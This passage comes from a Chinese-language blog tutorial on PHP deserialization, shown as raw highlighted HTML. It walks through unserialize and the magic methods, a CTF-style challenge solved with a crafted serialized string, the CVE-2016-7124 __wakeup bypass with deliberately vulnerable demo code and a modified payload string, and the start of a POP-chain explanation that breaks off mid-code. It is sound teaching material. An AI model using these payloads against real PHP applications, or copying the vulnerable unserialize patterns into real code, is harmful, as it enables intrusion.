class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">            <span class="comment">//$this-&gt;flag = $flag;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test1</span> = <span class="keyword">new</span> test(<span class="string">&#x27;user&#x27;</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="variable">$value_class</span> = <span class="string">&#x27;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;反序列化之前数值为：O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    var_dump(unserialize(<span class="variable">$value_class</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled2.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%202.png"></p><p>反序列化之后，变成了object。</p><hr><ul><li>栗子4</li></ul><p>我们更改一些代码：在类中增加变量flag，但是在序列化的字符串中不增加相关内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$flag</span>;<span class="comment">//增加的字段</span></span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test1</span> = <span class="keyword">new</span> test(<span class="string">&#x27;user&#x27;</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="variable">$value_class</span> = <span class="string">&#x27;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;</span>; <span class="comment">//未增加相应内容</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;反序列化之前数值为：O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    var_dump(unserialize(<span class="variable">$value_class</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//$testSerialize = serialize($test1);</span></span><br></pre></td></tr></table></figure><p>输出：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled3.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%203.png"></p><p>在反序列化后的对象中，多了一个字段flag，值为null；</p><p>如果在字符串中增加相关内容，但是定义的类中没有相关变量会怎么样？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test1</span> = <span class="keyword">new</span> test(<span class="string">&#x27;user&#x27;</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="variable">$value_class</span> = <span class="string">&#x27;O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;s:4:&quot;flag&quot;;s:4:&quot;asdf&quot;;&#125;&#x27;</span>; <span class="comment">//未增加相应内容</span></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;反序列化之前数值为：O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;user&quot;;s:3:&quot;age&quot;;i:20;&#125;&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    var_dump(unserialize(<span class="variable">$value_class</span>));</span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled4.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%204.png"></p><p>此时，会返回一个布尔类型的false。</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>所以，总结一下，unserilize要成功反序列化一个字符串的条件有以下：</p><ul><li>字符串的格式严格按照序列化的格式，否则会返回false</li><li>在反序列化的类中，包含字符串中的所有变量，否则返回false</li><li>处理该字符串的php文件中，应包含该类的定义（该php文件内有定义/包含的文件中有定义）</li></ul><h2 id="魔法函数"><a href="#魔法函数" class="headerlink" title="魔法函数"></a>魔法函数</h2><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><h3 id="construct"><a href="#construct" class="headerlink" title="__construct():"></a>__construct():</h3><ul><li>允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</li><li>也就是说，当代码中出现new关键字实例化一个对象时，会触发该函数</li></ul><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct():"></a>__destruct():</h3><ul><li>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</li><li>也就是说，在结束创建，不再使用该对象时，会触发该函数</li></ul><hr><ul><li>栗子5</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fxxy</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span> = <span class="string">&quot;fxxy&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;this is __construct()&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;fxxy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;this is __destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$test</span> = <span class="keyword">new</span> fxxy();</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="variable">$test</span>-&gt;name.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>输出：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled5.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%205.png"></p><p>可以看到，在页面中不会再使用到test这个对象后，系统自动调用了__destruct函数</p><hr><ul><li>栗子（__destruct()与unserilize()）</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fxxy</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span> = <span class="string">&quot;fxxy&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;this is __construct()&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;fxxy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;this is __destruct&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//$test = new fxxy();</span></span><br><span class="line">    <span class="variable">$value</span> = <span class="string">&#x27;O:4:&quot;fxxy&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;fxxy&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="comment">//echo($value);</span></span><br><span class="line">    unserialize(<span class="variable">$value</span>);</span><br><span class="line">    <span class="comment">//echo(&#x27;&lt;br&gt;&#x27;.$test-&gt;name.&#x27;&lt;br&gt;&#x27;);</span></span><br></pre></td></tr></table></figure><p>输出为：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled6.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%206.png"></p><p>可见，在运用unserilize()函数时，系统会自动调用__destruct()函数</p><h3 id="sleep"><a href="#sleep" class="headerlink" title="__sleep():"></a>__sleep():</h3><ul><li>关联函数：serialize()</li><li>作用：在调用serialize()函数时，系统会先查找该类中是否存在__sleep()函数，如果存在，则会优先调用此方法，<strong>返回预先设定好的允许被序列化的变量数组</strong>。</li></ul><p>在上文中，以栗子2，如果我们不想让某些变量显示出来怎么办？增加__sleep()函数，并在中定义可以被序列化的变量或方法</p><hr><ul><li>栗子6</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$flag</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line">            <span class="comment">//$this-&gt;flag = $flag;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$test1</span> = <span class="keyword">new</span> test(<span class="string">&#x27;user&#x27;</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span>(serialize(<span class="variable">$test1</span>));<span class="comment">//echo函数处理的是字符串变量</span></span><br></pre></td></tr></table></figure><p>此时输出：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled7.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%207.png"></p><p>可以看到输出中没有了flag字段</p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a>__wakeup()</h3><ul><li>关联函数：unserialize()</li><li>作用：当调用unserilize函数时，会先检查要反序列化的类中是否有__wakeup()方法，如果有，则优先调用此方法，通常用来执行一些反序列化之前的一些资源准备或初始化操作。</li></ul><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a>__toString()</h3><ul><li>定义在类中</li><li>用于处理当这个对象被当做字符串处理时返回的内容</li></ul><hr><ul><li>栗子7</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$flag</span>;        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$age</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = <span class="variable">$age</span>;</span><br><span class="line"></span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;can&#x27;t echo this object&quot;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$testClass</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$test1</span> = <span class="keyword">new</span> test(<span class="string">&#x27;user&#x27;</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$test1</span>);</span><br></pre></td></tr></table></figure><p>输出：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled8.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%208.png"></p><h3 id="call"><a href="#call" class="headerlink" title="__call()"></a>__call()</h3><ul><li>当访问该类中不存在方法时，会触发此方法</li></ul><h3 id="get"><a href="#get" class="headerlink" title="__get()"></a>__get()</h3><ul><li>当访问该类中不存在的属性时，会触发此方法</li></ul><p>看一下call和get的实践</p><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">fxxy</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$argu</span></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t have the function!&lt;br&gt;&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t have the attr&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$test</span> = <span class="keyword">new</span> fxxy();</span><br><span class="line">   <span class="variable">$test</span>-&gt;hello();</span><br><span class="line">   <span class="keyword">echo</span>(<span class="variable">$test</span>-&gt;b);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/image-20200624165056534.png" alt="image-20200624165056534"></p><h2 id="小实践"><a href="#小实践" class="headerlink" title="小实践"></a>小实践</h2><h3 id="小题目"><a href="#小题目" class="headerlink" title="小题目"></a>小题目</h3><p>在test.php中我们写入下面的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$pwd</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$pwd</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;name === <span class="string">&quot;welcome&quot;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;pwd === <span class="string">&quot;password&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;wrong name and passwords&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$query</span>))&#123;</span><br><span class="line">        <span class="variable">$flag</span> = unserialize(<span class="variable">$query</span>);</span><br><span class="line">        <span class="variable">$flag</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;Plz input id~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$test1</span> = <span class="keyword">new</span> test(<span class="string">&quot;welcome&quot;</span>,<span class="string">&quot;password&quot;</span>);</span><br><span class="line">    <span class="comment">//echo(serialize($test1));</span></span><br><span class="line">   show_source(<span class="keyword">__FILE__</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：代码会对提交的id进行反序列化，当反序列化的name变量与pwd变量与代码指定的相同时，则会包含flag.php，输出flag。</p><p>方法：构造test类的序列化字符串，参数值为welcome和password，然后传入id</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled9.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%209.png"></p><h3 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h3><ul><li>版本：PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10</li><li>核心：当序列化的字符串中，对象变量的个数大于实际已定义的类中的个数时，会绕过__wakeup()函数</li></ul><h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$name</span> = <span class="string">&#x27;merryting&#x27;</span> ;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;good bye &quot;</span>.<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">            <span class="variable">$fp</span> = fopen(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">            fwrite(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;name);</span><br><span class="line">            fclose(<span class="variable">$fp</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;merryting&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//$test = new A(&#x27;fxxy&#x27;);</span></span><br><span class="line">    <span class="comment">//echo(serialize($test));</span></span><br><span class="line">    <span class="comment">//O:1:&quot;A&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;fxxy&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$name</span>);</span><br><span class="line">    unserialize(<span class="variable">$name</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码分析：</p><ul><li>在执行<strong>destroy()函数中的文件写入功能之前，会调用</strong>wakeup()函数将此对象的name设置为：merryting</li><li>也就是说，如果传入常规的序列化字符串，存入的name始终是merryting</li></ul><p>比如我传入的是fxxy：输出和写入的都是merryting</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled10.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%2010.png"></p><p>那怎么利用？cve-2016-7124的核心就是绕过__wakeup()函数，怎么绕过，就是将传入的序列化字符串中的变量的个数设置大于实际的个数</p><p>前：O:1:”A”:<strong>1</strong>:{s:4:”name”;s:4:”fxxy”;}</p><p>后：O:1:”A”:<strong>2</strong>:{s:4:”name”;s:4:”fxxy”;}</p><p>此时，浏览器输出为：</p><p><img src="https://fxxy-blog.oss-cn-hangzhou.aliyuncs.com/Untitled11.png" alt="PHP%20a3faa3df2354433297591bd6cb36c882/Untitled%2011.png"></p><p>此时可以看到，名字更换了，不是<strong>wakeup()函数中替换的数据，说明绕过了</strong>wakeup()函数。</p><p>绕过了<strong>wakeup()函数，接下来做什么？unserilize()函数在反序列化字符串时，结束时如果该类中定义了</strong>destruct()函数，则会调用此函数，此函数的作用见上文。如果此时__destruct()函数中存在可利用点，则可能造成反序列化漏洞（开发人员应该没有这么蠢，在显而易见的地方写敏感操作），那么，下面学习反序列化中比较复杂的一个东西——POP链</p><h2 id="初识POP链"><a href="#初识POP链" class="headerlink" title="初识POP链"></a>初识POP链</h2><ul><li><p>什么是pop链？</p><ul><li><p>假设现在我们找到了一个可以利用的unserilize点，但是在该类下的魔法函数中没有敏感的操作，简言之，找到了一个利用入口，但是没有找到我们可以利用的东西，此时，如果在魔法函数中，有代码片段调用了其他页面的属性（方法），在被调用的属性（方法）中<strong>存在同名的魔法函数/普通函数</strong>，且该函数中存在一些敏感操作，那我们就相当于找到一条路通到漏洞那里。</p></li><li><p>像上面这样，找到一个可利用点后，不断递推，在从被调用的属性（方法）中寻找敏感操作，最终串联起来，就像一个链条一样，通过层层查找，将入口和目的地连起来的方式，就是POP链</p><h3 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h3><p>借用柠檬师傅的代码学习一下~</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span 